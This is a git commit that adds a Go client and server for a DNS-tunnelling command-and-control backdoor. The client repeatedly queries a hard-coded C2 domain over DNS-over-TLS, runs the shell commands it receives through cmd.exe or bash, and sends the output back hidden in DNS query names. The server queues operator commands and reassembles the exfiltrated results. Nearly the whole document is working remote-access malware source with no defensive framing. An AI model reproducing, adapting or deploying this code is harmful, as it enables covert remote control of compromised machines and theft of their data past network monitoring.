631287b7be31eceaf69d65cded21aca1b22cdc42
CZ <cfd0123456789@qq.com>
2022-07-17 19:17:44 +0800

    init

---
+++ client.go
@@ -0,0 +1,211 @@
+package main
+
+import (
+	"github.com/jxskiss/base62"
+	"github.com/miekg/dns"
+	"math"
+	"os/exec"
+	"runtime"
+	"strconv"
+	"strings"
+	"sync"
+	"time"
+)
+
+var wg = sync.WaitGroup{}
+
+const c2addr = ".r.rce.moe."//必须以点开头结尾
+
+const addrstr = "123.125.81.6:853"
+
+//const addrstr = "8.8.8.8:53"
+const payloadlen = 70.00
+const retry = 10
+const t = 10 //多线程
+var sleep = 10
+
+func send(data []byte, packnumer string, mapnumer string, ch chan bool) {
+	defer wg.Done()
+	trytimes := 0
+	ch <- true
+	//if (float64(len(data))*1.35 + float64(len(c2addr)+len(packnumer)+1+1+6)) < (payloadlen) {
+	m := new(dns.Msg)
+	m.SetQuestion(packnumer+"-"+mapnumer+"-"+string(base62.Encode(data))+c2addr, dns.TypeTXT)
+	//cl := &dns.Client{}
+	cl := &dns.Client{Net: "tcp-tls"}
+SEND1:
+	in, _, err := cl.Exchange(m, addrstr)
+	if err != nil {
+		println("conn err retry \n%v", in)
+		if trytimes > retry {
+			println("senddata err ")
+			<-ch
+			return
+		}
+		trytimes += 1
+		goto SEND1
+	}
+	if in == nil || in.Rcode != dns.RcodeSuccess {
+		println("invalid answer retry \n%v", in)
+		if trytimes > retry {
+			println("senddata err")
+			<-ch
+			return
+		}
+		trytimes += 1
+		goto SEND1
+	}
+
+	//}
+	<-ch
+}
+func senddata(data []byte, packnumer string) {
+	//trytimes := 0
+	ch := make(chan bool, t)
+	if (float64(len(data))*1.35 + float64(len(c2addr)+len(packnumer)+1+1+6)) < (payloadlen) {
+		wg.Add(1)
+		send(data, packnumer, "ffffff", ch)
+
+	} else {
+		/*需要分片*/
+		limitlen := int(math.Floor((payloadlen - float64(len(c2addr)+len(packnumer)+1+1+6)) / 1.35))
+		//分片最大数量 16777215 可以修改 575Mb
+		// 包序号-分片序号-数据.addr
+		times := int(math.Ceil(float64(len(data)) / float64(limitlen)))
+		if times > 16777215 {
+			println("senddata err")
+			return
+		}
+		println("max bits ", 16777215*limitlen)
+		var tempdata []byte
+		for i := 0; i < times; i++ {
+
+			if i*limitlen+limitlen < len(data) {
+				tempdata = data[(i * limitlen) : (i+1)*limitlen]
+			} else {
+				tempdata = data[(i * limitlen):]
+			}
+			//m := new(dns.Msg)
+			if i != (times - 1) {
+				//m.SetQuestion(packnumer+"-"+strconv.FormatInt(int64(i), 16)+"-"+string(base62.Encode([]byte(tempdata)))+c2addr, dns.TypeTXT)
+				wg.Add(1)
+				go send(tempdata, packnumer, strconv.FormatInt(int64(i), 16), ch)
+			} else {
+				//m.SetQuestion(packnumer+"-ffffff-"+string(base62.Encode([]byte(tempdata)))+c2addr, dns.TypeTXT)
+			}
+
+			/*
+					println(packnumer + "-" + strconv.FormatInt(int64(i), 16) + "-" + string(base62.Encode([]byte(tempdata))) + c2addr)
+					cl := &dns.Client{}
+				SEND:
+					in, _, err := cl.Exchange(m, addrstr)
+					if err != nil {
+						println("conn err retry")
+						if trytimes > retry {
+							println("senddata err")
+							return
+						}
+						trytimes += 1
+						goto SEND
+
+					}
+					if in == nil || in.Rcode != dns.RcodeSuccess {
+						println("invalid answer retry")
+						if trytimes > retry {
+							println("senddata err ")
+							return
+						}
+						trytimes += 1
+						goto SEND
+					}
+			*/
+		}
+		wg.Wait()
+		wg.Add(1)
+		send(tempdata, packnumer, "ffffff", ch) //阻塞  最后一个包
+		print("发送完毕")
+	}
+}
+
+func main() {
+
+	m := new(dns.Msg)
+	m.SetQuestion(strconv.FormatInt(int64(time.Now().Unix()), 16)+c2addr, dns.TypeTXT)
+
+	//cl := &dns.Client{Net: "tcp-tls"}
+	//cl := &dns.Client{}
+
+	/*
+		e := new(dns.EDNS0_SUBNET) //EDNS
+		e.Code = dns.EDNS0SUBNET
+		e.Family = 1
+		e.SourceNetmask = 24
+		e.Address = net.ParseIP("1.1.1.1").To4()
+		e.SourceScope = 0
+		o.Option = append(o.Option, e)
+	*/
+	//	o := new(dns.OPT)
+	//	o.Hdr.Name = "."
+	//	o.Hdr.Rrtype = dns.TypeOPT
+	//	e := new(dns.EDNS0_LOCAL)
+	//	e.Code = dns.EDNS0LOCALSTART
+	//	e.Data = []byte{72, 82, 74}
+	//	o.Option = append(o.Option, e)
+
+	for {
+
+		m := new(dns.Msg)
+		m.SetQuestion(strconv.FormatInt(int64(time.Now().Unix()), 16)+c2addr, dns.TypeTXT)
+		cl := &dns.Client{Net: "tcp-tls"}
+		o := new(dns.OPT)
+		o.Hdr.Name = "."
+		o.Hdr.Rrtype = dns.TypeOPT
+		m.Extra = append(m.Extra, o)
+		in, _, err := cl.Exchange(m, addrstr)
+		if err != nil {
+			println(err)
+		}
+
+		if in != nil {
+			if in.Rcode == dns.RcodeSuccess {
+				for _, answer := range in.Answer {
+					if answer.Header().Rrtype == dns.TypeTXT {
+						for _, txt := range answer.(*dns.TXT).Txt {
+							cmdarr := strings.Split(txt, "|")
+							if len(cmdarr) != 2 {
+								continue
+							}
+							execmd, err := base62.Decode([]byte(cmdarr[1]))
+							if err != nil {
+								senddata([]byte("Decode error"), cmdarr[0])
+								continue
+							}
+
+							if runtime.GOOS == "windows" {
+								cmd := exec.Command("cmd.exe", "/c", string(execmd))
+								output, err := cmd.Output()
+								if err != nil {
+									senddata([]byte(err.Error()), cmdarr[0])
+								}
+								senddata(output, cmdarr[0])
+							} else {
+								cmd := exec.Command("/bin/bash", "-c", string(execmd))
+								output, err := cmd.Output()
+								if err != nil {
+									senddata([]byte(err.Error()), cmdarr[0])
+								}
+								senddata(output, cmdarr[0])
+							}
+							println(txt)
+						}
+					}
+				}
+			}
+		}
+		time.Sleep(time.Second * time.Duration(sleep))
+	}
+	//log.Println(in)
+	//log.Println(a)
+	senddata([]byte("123456789123456789123456789123456789"), " ")
+
+}
---
+++ server.go
@@ -0,0 +1,111 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"github.com/jxskiss/base62"
+	"github.com/miekg/dns"
+	"hash/crc32"
+	"os"
+	"strconv"
+	"strings"
+	"time"
+)
+
+func main() {
+	resultMap := make(map[string]map[string]string)
+	cmdMap := make(map[string]string)
+
+	go dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {
+		var resp dns.Msg
+		resp.SetReply(req)
+		for _, q := range req.Question {
+			str1 := strings.Split(q.Name, ".")
+			str2 := strings.Split(str1[0], "-")
+			if len(str2) == 3 {
+				delete(cmdMap, str2[0])
+				data, err := base62.Decode([]byte(str2[2]))
+				if err == nil {
+					//log.Printf(string(data))
+				} else {
+					//log.Printf("err data :" + str2[2])
+				}
+				result := make(map[string]string)
+				value, ok := resultMap[str2[0]]
+				if ok {
+					result = value
+				} else {
+					result = make(map[string]string)
+					fmt.Println("开始接收:" + str2[0])
+				}
+				result[str2[1]] = string(data)
+				resultMap[str2[0]] = result
+
+				if str2[1] == "ffffff" {
+					outdata := ""
+					for i := 0; i < (len(resultMap[str2[0]]) - 1); i++ {
+						value, ok := resultMap[str2[0]][strconv.FormatInt(int64(i), 16)]
+						if ok {
+							outdata = outdata + value
+						} else {
+							result = make(map[string]string)
+							fmt.Println("损坏的数据 缺少分片:" + strconv.FormatInt(int64(i), 16))
+						}
+					}
+					outdata = outdata + string(data)
+					fmt.Println(str2[0] + " 接收完毕:\n" + outdata)
+					delete(resultMap, str2[0])
+				}
+
+			}
+			/*
+				data, err := base62.Decode([]byte(str1[0]))
+
+				if err == nil {
+					log.Printf(string(data))
+				} else {
+					log.Printf("err data :" + str1[0])
+				}
+			*/
+			/*
+				file, err := os.Open("debug.txt")
+				if err != nil {
+					panic(err)
+				}
+				br := bufio.NewReader(file)
+
+			*/
+			//for {
+			/*content, _, c := br.ReadLine()
+			if c == io.EOF {
+				break
+			}
+
+			*/
+			for k, v := range cmdMap {
+				asw := dns.TXT{
+					Hdr: dns.RR_Header{
+						Name:   q.Name,
+						Rrtype: dns.TypeTXT,
+						Class:  dns.ClassINET,
+						Ttl:    0,
+					},
+					Txt: []string{k + "|" + string(base62.Encode([]byte(v)))},
+				}
+				resp.Answer = append(resp.Answer, &asw)
+			}
+
+			//}
+			//file.Close()
+		}
+		w.WriteMsg(&resp)
+	})
+	go dns.ListenAndServe(":53", "udp", nil)
+	reader := bufio.NewReader(os.Stdin)
+	for {
+		print("cmd: ")
+		text, _ := reader.ReadString('\n')
+		cmdMap[strconv.FormatInt(int64(crc32.ChecksumIEEE([]byte(text[0:len(text)-1])))+time.Now().Unix(), 16)] = text[0 : len(text)-1]
+	}
+
+}
